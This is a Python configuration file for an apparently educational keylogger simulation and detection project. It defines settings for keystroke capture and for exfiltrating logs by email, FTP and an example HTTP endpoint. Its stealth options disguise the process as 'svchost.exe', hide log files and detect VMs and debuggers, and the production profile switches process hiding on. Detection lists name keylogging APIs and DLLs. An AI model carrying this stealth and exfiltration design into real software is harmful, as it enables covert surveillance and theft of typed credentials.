# src/keylogger_sim/config.py
"""
Configuration module for the Keylogger Cybersecurity Project.
Centralizes all settings for easy modification and environment-specific deployment.

IMPORTANT: This is for EDUCATIONAL PURPOSES ONLY. 
Only use in controlled lab environments with explicit authorization.
"""

import os
import logging
from datetime import datetime
from pathlib import Path
from typing import Dict, Any, Optional, List

# ============================================================================
# BASE CONFIGURATION
# ============================================================================

class Config:
    """Base configuration class with default settings"""
    
    # Project metadata
    PROJECT_NAME = "Keylogger Cybersecurity Project"
    VERSION = "1.0.0"
    ENVIRONMENT = "development"  # development, testing, production
    
    # ========================================================================
    # LOGGING CONFIGURATION
    # ========================================================================
    
    # File paths
    BASE_DIR = Path(__file__).parent.parent.parent
    LOG_DIR = BASE_DIR / "logs"
    DATA_DIR = BASE_DIR / "data"
    REPORTS_DIR = BASE_DIR / "reports"
    
    # Log files
    KEYSTROKE_LOG_FILE = LOG_DIR / "keystrokes.log"
    SYSTEM_LOG_FILE = LOG_DIR / "system.log"
    DETECTION_LOG_FILE = LOG_DIR / "detection.log"
    EXFILTRATION_LOG_FILE = LOG_DIR / "exfiltration.log"
    
    # Log rotation settings
    LOG_MAX_SIZE_MB = 10
    LOG_BACKUP_COUNT = 5
    LOG_LEVEL = logging.INFO
    
    # Buffer settings
    BUFFER_SIZE = 50  # Number of keystrokes before flushing
    AUTO_FLUSH_INTERVAL = 10  # Seconds between automatic flushes
    
    # ========================================================================
    # KEYLOGGER FEATURES (OFFENSIVE SIMULATION)
    # ========================================================================
    
    # Capture settings
    CAPTURE_KEYBOARD = True
    CAPTURE_MOUSE = False
    CAPTURE_CLIPBOARD = False
    CAPTURE_SCREENSHOTS = False
    
    # Keystroke logging
    LOG_SPECIAL_KEYS = True
    LOG_TIMESTAMPS = True
    LOG_WINDOW_TITLES = True  # Log which application is being used
    LOG_USER_SESSIONS = True  # Track login/logout
    
    # Encrypted logging
    ENABLE_ENCRYPTION = True
    ENCRYPTION_ALGORITHM = "AES-256"  # AES-256, ChaCha20
    ENCRYPTION_KEY_FILE = DATA_DIR / "encryption.key"
    ENCRYPTION_SALT_FILE = DATA_DIR / "encryption.salt"
    PBKDF2_ITERATIONS = 100000  # For key derivation
    
    # ========================================================================
    # EXFILTRATION CONFIGURATION (SIMULATED)
    # ========================================================================
    
    # Email exfiltration
    ENABLE_EMAIL_EXFILTRATION = False  # Set to True to simulate
    SMTP_SERVER = "smtp.gmail.com"
    SMTP_PORT = 587
    SMTP_USERNAME = ""  # Set via environment variable
    SMTP_PASSWORD = ""  # Set via environment variable
    EMAIL_RECIPIENT = "security-lab@example.com"
    EMAIL_SUBJECT = f"[KEYLOG] {datetime.now().strftime('%Y-%m-%d')}"
    EMAIL_SEND_INTERVAL = 3600  # Seconds between emails (1 hour)
    
    # FTP exfiltration
    ENABLE_FTP_EXFILTRATION = False
    FTP_HOST = ""
    FTP_PORT = 21
    FTP_USERNAME = ""
    FTP_PASSWORD = ""
    FTP_REMOTE_DIR = "/keylogs/"
    
    # HTTP/HTTPS exfiltration
    ENABLE_HTTP_EXFILTRATION = False
    HTTP_ENDPOINT = "https://example.com/api/keylogs"
    HTTP_API_KEY = ""
    
    # ========================================================================
    # STEALTH CONFIGURATION
    # ========================================================================
    
    # Process hiding
    HIDE_PROCESS = False
    PROCESS_NAME = "svchost.exe"  # Legitimate-looking process name
    PROCESS_DESCRIPTION = "Windows Service Host"
    
    # File hiding
    HIDE_LOG_FILES = False
    LOG_FILE_ATTRIBUTES = "hidden"  # hidden, system, readonly
    
    # Anti-detection
    DETECT_VM = False  # Check for virtual machine environment
    DETECT_DEBUGGER = False  # Check for debugger attachment
    DETECT_SANDBOX = False  # Check for sandbox environment
    
    # ========================================================================
    # DETECTION CONFIGURATION (DEFENSIVE)
    # ========================================================================
    
    # Process scanning
    SCAN_INTERVAL = 30  # Seconds between scans
    SUSPICIOUS_PROCESS_NAMES = [
        'keylog', 'spy', 'monitor', 'capture', 
        'logger', 'record', 'stealth', 'hook',
        'sniff', 'grab', 'stealer'
    ]
    
    # Known keylogging DLLs
    SUSPICIOUS_DLLS = [
        'keyhook.dll', 'keylogger.dll', 'spylib.dll',
        'hookman.dll', 'grabber.dll'
    ]
    
    # Keylogging API patterns
    SUSPICIOUS_API_CALLS = [
        'GetAsyncKeyState',
        'SetWindowsHookEx',
        'WH_KEYBOARD_LL',
        'GetKeyState',
        'RegisterRawInputDevices',
        'OpenClipboard',
        'GetClipboardData'
    ]
    
    # Network monitoring
    MONITOR_NETWORK = True
    SUSPICIOUS_PORTS = [25, 465, 587, 143, 993, 80, 443, 21, 22, 8080]
    SUSPICIOUS_PROTOCOLS = ['SMTP', 'FTP', 'HTTP', 'HTTPS']
    DATA_EXFILTRATION_THRESHOLD = 10  # MB per hour
    
    # ========================================================================
    # GUI CONFIGURATION
    # ========================================================================
    
    GUI_THEME = "dark"  # dark, light, system
    GUI_WIDTH = 700
    GUI_HEIGHT = 500
    GUI_FONT = ("Segoe UI", 10)
    GUI_TITLE = "Keylogger Detection & Analysis Tool"
    
    # Color scheme
    COLORS = {
        'danger': '#f44336',
        'warning': '#ff9800',
        'success': '#4caf50',
        'info': '#2196f3',
        'background': '#1e1e1e',
        'foreground': '#ffffff'
    }
    
    # ========================================================================
    # WEB DASHBOARD CONFIGURATION
    # ========================================================================
    
    DASHBOARD_HOST = "127.0.0.1"
    DASHBOARD_PORT = 5000
    DASHBOARD_DEBUG = True
    DASHBOARD_SECRET_KEY = os.urandom(24).hex()
    
    # Dashboard features
    DASHBOARD_ENABLE_AUTH = False
    DASHBOARD_USERNAME = "admin"
    DASHBOARD_PASSWORD = "changeme"  # Change this in production!
    
    # Real-time updates
    DASHBOARD_REFRESH_INTERVAL = 5000  # Milliseconds
    DASHBOARD_MAX_LOGS_DISPLAY = 100
    
    # ========================================================================
    # REPORTING CONFIGURATION
    # ========================================================================
    
    GENERATE_REPORTS = True
    REPORT_FORMAT = "PDF"  # PDF, HTML, JSON
    REPORT_INCLUDE_STATISTICS = True
    REPORT_INCLUDE_CHARTS = True
    REPORT_INCLUDE_TIMELINE = True
    
    # Alert thresholds
    ALERT_KEYSTROKES_PER_MINUTE = 300  # Suspicious typing speed
    ALERT_UNUSUAL_HOURS = [2, 3, 4, 5]  # Hours when activity is suspicious
    ALERT_SENSITIVE_KEYWORDS = [
        'password', 'username', 'login', 'email', 
        'credit', 'card', 'ssn', 'social', 'security'
    ]
    
    # ========================================================================
    # DATABASE CONFIGURATION (Optional)
    # ========================================================================
    
    USE_DATABASE = False
    DATABASE_TYPE = "sqlite"  # sqlite, postgresql, mysql
    DATABASE_PATH = DATA_DIR / "keylogger.db"
    DATABASE_CONNECTION_STRING = f"sqlite:///{DATABASE_PATH}"
    
    # ========================================================================
    # ENVIRONMENT VARIABLES OVERRIDE
    # ========================================================================
    
    def __init__(self):
        """Initialize configuration and override with environment variables"""
        self._load_environment_variables()
        self._create_directories()
        self._setup_logging()
    
    def _load_environment_variables(self):
        """Override configuration with environment variables"""
        # Logging
        if os.getenv('LOG_LEVEL'):
            self.LOG_LEVEL = getattr(logging, os.getenv('LOG_LEVEL').upper())
        
        # Encryption
        if os.getenv('ENABLE_ENCRYPTION'):
            self.ENABLE_ENCRYPTION = os.getenv('ENABLE_ENCRYPTION').lower() == 'true'
        
        # Exfiltration
        if os.getenv('SMTP_USERNAME'):
            self.SMTP_USERNAME = os.getenv('SMTP_USERNAME')
        if os.getenv('SMTP_PASSWORD'):
            self.SMTP_PASSWORD = os.getenv('SMTP_PASSWORD')
        if os.getenv('EMAIL_RECIPIENT'):
            self.EMAIL_RECIPIENT = os.getenv('EMAIL_RECIPIENT')
        
        # Database
        if os.getenv('DATABASE_CONNECTION_STRING'):
            self.DATABASE_CONNECTION_STRING = os.getenv('DATABASE_CONNECTION_STRING')
        
        # Dashboard authentication
        if os.getenv('DASHBOARD_USERNAME'):
            self.DASHBOARD_USERNAME = os.getenv('DASHBOARD_USERNAME')
        if os.getenv('DASHBOARD_PASSWORD'):
            self.DASHBOARD_PASSWORD = os.getenv('DASHBOARD_PASSWORD')
        
        # Stealth
        if os.getenv('HIDE_PROCESS'):
            self.HIDE_PROCESS = os.getenv('HIDE_PROCESS').lower() == 'true'
        if os.getenv('PROCESS_NAME'):
            self.PROCESS_NAME = os.getenv('PROCESS_NAME')
    
    def _create_directories(self):
        """Create necessary directories"""
        for directory in [self.LOG_DIR, self.DATA_DIR, self.REPORTS_DIR]:
            directory.mkdir(parents=True, exist_ok=True)
    
    def _setup_logging(self):
        """Configure logging"""
        logging.basicConfig(
            level=self.LOG_LEVEL,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(self.SYSTEM_LOG_FILE),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(self.PROJECT_NAME)
    
    # ========================================================================
    # UTILITY METHODS
    # ========================================================================
    
    def get_config(self) -> Dict[str, Any]:
        """Return all configuration as dictionary"""
        return {
            'project_name': self.PROJECT_NAME,
            'version': self.VERSION,
            'environment': self.ENVIRONMENT,
            'logging': {
                'level': self.LOG_LEVEL,
                'keystroke_log': str(self.KEYSTROKE_LOG_FILE),
                'system_log': str(self.SYSTEM_LOG_FILE),
                'buffer_size': self.BUFFER_SIZE,
                'auto_flush_interval': self.AUTO_FLUSH_INTERVAL
            },
            'keylogger': {
                'capture_keyboard': self.CAPTURE_KEYBOARD,
                'capture_mouse': self.CAPTURE_MOUSE,
                'capture_clipboard': self.CAPTURE_CLIPBOARD,
                'capture_screenshots': self.CAPTURE_SCREENSHOTS,
                'log_special_keys': self.LOG_SPECIAL_KEYS,
                'log_timestamps': self.LOG_TIMESTAMPS,
                'log_window_titles': self.LOG_WINDOW_TITLES,
                'enable_encryption': self.ENABLE_ENCRYPTION,
                'encryption_algorithm': self.ENCRYPTION_ALGORITHM
            },
            'detection': {
                'scan_interval': self.SCAN_INTERVAL,
                'suspicious_processes': self.SUSPICIOUS_PROCESS_NAMES,
                'suspicious_dlls': self.SUSPICIOUS_DLLS,
                'suspicious_api_calls': self.SUSPICIOUS_API_CALLS,
                'monitor_network': self.MONITOR_NETWORK,
                'suspicious_ports': self.SUSPICIOUS_PORTS
            },
            'dashboard': {
                'host': self.DASHBOARD_HOST,
                'port': self.DASHBOARD_PORT,
                'debug': self.DASHBOARD_DEBUG,
                'refresh_interval': self.DASHBOARD_REFRESH_INTERVAL
            }
        }
    
    def get_encryption_key(self) -> Optional[bytes]:
        """Load or generate encryption key"""
        if not self.ENABLE_ENCRYPTION:
            return None
        
        if self.ENCRYPTION_KEY_FILE.exists():
            with open(self.ENCRYPTION_KEY_FILE, 'rb') as f:
                return f.read()
        else:
            # Generate new key
            from cryptography.fernet import Fernet
            key = Fernet.generate_key()
            with open(self.ENCRYPTION_KEY_FILE, 'wb') as f:
                f.write(key)
            self.logger.info("Generated new encryption key")
            return key
    
    def get_salt(self) -> bytes:
        """Load or generate salt for PBKDF2"""
        if self.ENCRYPTION_SALT_FILE.exists():
            with open(self.ENCRYPTION_SALT_FILE, 'rb') as f:
                return f.read()
        else:
            import os
            salt = os.urandom(16)
            with open(self.ENCRYPTION_SALT_FILE, 'wb') as f:
                f.write(salt)
            return salt
    
    def is_suspicious_hour(self) -> bool:
        """Check if current time is in suspicious hours"""
        current_hour = datetime.now().hour
        return current_hour in self.ALERT_UNUSUAL_HOURS
    
    def is_sensitive_keyword(self, text: str) -> bool:
        """Check if text contains sensitive keywords"""
        text_lower = text.lower()
        for keyword in self.ALERT_SENSITIVE_KEYWORDS:
            if keyword in text_lower:
                return True
        return False
    
    def validate(self) -> List[str]:
        """Validate configuration and return list of warnings/errors"""
        warnings = []
        
        # Check for sensitive defaults
        if self.DASHBOARD_PASSWORD == "changeme" and self.DASHBOARD_ENABLE_AUTH:
            warnings.append("Dashboard password is set to default value!")
        
        # Check exfiltration settings
        if self.ENABLE_EMAIL_EXFILTRATION and not self.SMTP_USERNAME:
            warnings.append("Email exfiltration enabled but SMTP_USERNAME not set")
        
        if self.ENABLE_EMAIL_EXFILTRATION and not self.SMTP_PASSWORD:
            warnings.append("Email exfiltration enabled but SMTP_PASSWORD not set")
        
        # Check encryption
        if self.ENABLE_ENCRYPTION:
            try:
                import cryptography
            except ImportError:
                warnings.append("Encryption enabled but cryptography library not installed")
        
        return warnings
    
    def to_json(self) -> str:
        """Export configuration as JSON string"""
        import json
        return json.dumps(self.get_config(), indent=2, default=str)


# ============================================================================
# CONFIGURATION PROFILES
# ============================================================================

class DevelopmentConfig(Config):
    """Development environment configuration"""
    ENVIRONMENT = "development"
    DASHBOARD_DEBUG = True
    LOG_LEVEL = logging.DEBUG
    ENABLE_ENCRYPTION = False
    HIDE_PROCESS = False


class TestingConfig(Config):
    """Testing environment configuration"""
    ENVIRONMENT = "testing"
    DASHBOARD_DEBUG = False
    LOG_LEVEL = logging.INFO
    ENABLE_ENCRYPTION = True
    HIDE_PROCESS = False
    USE_DATABASE = True
    DATABASE_TYPE = "sqlite"
    DATABASE_PATH = Config.DATA_DIR / "test_keylogger.db"


class ProductionConfig(Config):
    """Production environment configuration"""
    ENVIRONMENT = "production"
    DASHBOARD_DEBUG = False
    LOG_LEVEL = logging.WARNING
    ENABLE_ENCRYPTION = True
    HIDE_PROCESS = True
    USE_DATABASE = True
    DATABASE_TYPE = "postgresql"
    DASHBOARD_ENABLE_AUTH = True
    GENERATE_REPORTS = True
    REPORT_FORMAT = "PDF"


# ============================================================================
# CONFIGURATION FACTORY
# ============================================================================

def get_config(environment: str = None) -> Config:
    """
    Factory function to get appropriate configuration.
    
    Args:
        environment: 'development', 'testing', 'production'
    
    Returns:
        Config: Configuration instance
    """
    if environment is None:
        environment = os.getenv('ENVIRONMENT', 'development')
    
    configs = {
        'development': DevelopmentConfig,
        'testing': TestingConfig,
        'production': ProductionConfig
    }
    
    config_class = configs.get(environment, DevelopmentConfig)
    return config_class()


# ============================================================================
# SINGLETON INSTANCE
# ============================================================================

# Create a global configuration instance
config = get_config()

# Validate configuration on import
warnings = config.validate()
if warnings:
    config.logger.warning("Configuration warnings:")
    for warning in warnings:
        config.logger.warning(f"  - {warning}")


# ============================================================================
# USAGE EXAMPLES
# ============================================================================

if __name__ == "__main__":
    # Display current configuration
    print("=" * 60)
    print(f"Configuration: {config.PROJECT_NAME} v{config.VERSION}")
    print(f"Environment: {config.ENVIRONMENT}")
    print("=" * 60)
    
    # Print key settings
    print(f"\n Log Directory: {config.LOG_DIR}")
    print(f" Encryption: {'Enabled' if config.ENABLE_ENCRYPTION else 'Disabled'}")
    print(f" Dashboard: http://{config.DASHBOARD_HOST}:{config.DASHBOARD_PORT}")
    print(f" Scan Interval: {config.SCAN_INTERVAL} seconds")
    
    # Display configuration JSON
    print("\n Full Configuration:")
    print("-" * 60)
    print(config.to_json())
    
    # Validate
    print("\n Validation Results:")
    if config.validate():
        for warning in config.validate():
            print(f"  ⚠️  {warning}")
    else:
        print("  No configuration warnings")
